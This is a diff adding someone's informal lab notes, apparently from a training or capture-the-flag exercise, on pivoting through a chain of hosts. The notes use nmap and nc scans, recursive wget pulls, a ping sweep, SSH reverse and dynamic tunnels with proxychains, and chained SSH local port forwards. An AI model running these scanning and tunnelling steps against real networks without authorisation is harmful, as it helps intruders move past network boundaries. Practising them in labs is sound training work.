@@ -1,0 +1,81 @@
+Float IP - 10.50.24.223
+
+nmap 10.50.24.223 -T4 -sV -vvvv -p21-23,80 -Pn
+
+return 23 and 80 
+
+ nc to verify :: nc  10.50.24.223 22 :: each open port verify services
+
+wget -r 10.50.24.223
+
+cat the file eog 10.50.24.223/Rick-http.png
+
+telnet 10.50.24.223
+
+------------------------------------------------------------------------------
+host enumerate :
+
+(ip a / ip n / ip r / ss -ntlp {might determine that a specific port is ope that you didnt see from nmap} )
+ss -antp :: from target machine you can find out how you apear to the machine for reverse shell creation 
+ip n | grep -v FAILED
+for i in {17..30} ; do (ping -c 1 10.50.24.$i | grep "bytes from" &) ;done
+-----------------------------------------------------------------------------
+
+--------------------------------------------------
+from rick 
+ssh student@10.50.25.214 -R 50899:127.0.0.1:22 -NT
+cus we found 22 is open revere reverse 
+--------------------------------------------------
+
+-------------------------------------------------
+from blue 
+(test it time)
+NC 127.0.0.1 50899
+ssh rick@127.0.0.1 -p 50899
+
+ssh Rick@127.0.0.1 -p 50899 -D 9050 -NT
+dynamic to use our tools baby 
+
+proxychains nmap 10.1.2.18 and .27 -T4 -sV -vvvv -p21-23,80 -Pn
+proxychains nc  10.1.2.18 21 :: each open port verify services
+proxychains nc  10.1.2.18 80 :: each open port verify services
+
+proxychains wget -r 10.1.2.18
+
+proxychains wget -r ftp://10.1.2.18
+
+eog 10.1.2.18/*.png looks at all png files from that machine 
+
+proxychains nmap 10.1.2.18 -T4 -vvvv -p1024- -Pn
+2222/tcp open  EtherNetIP-1 syn-ack
+proxychains nc 10.1.2.18 2222
+
+ssh Rick@127.0.0.1 -p 50899 -L 50801:10.1.2.18:2222 -NT
+test it -
+nc 127.0.0.1 50801
+ssh Morty@127.0.0.1 -p 50801
+-
+
+
+ssh Morty@127.0.0.1 -p 50801 -L 50802:172.16.10.121:2323 -NT
+ssh Jerry@127.0.0.1 -p 50802 -L 50803:192.168.10.69:22 -NT
+ssh Beth@127.0.0.1 -p 50803
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
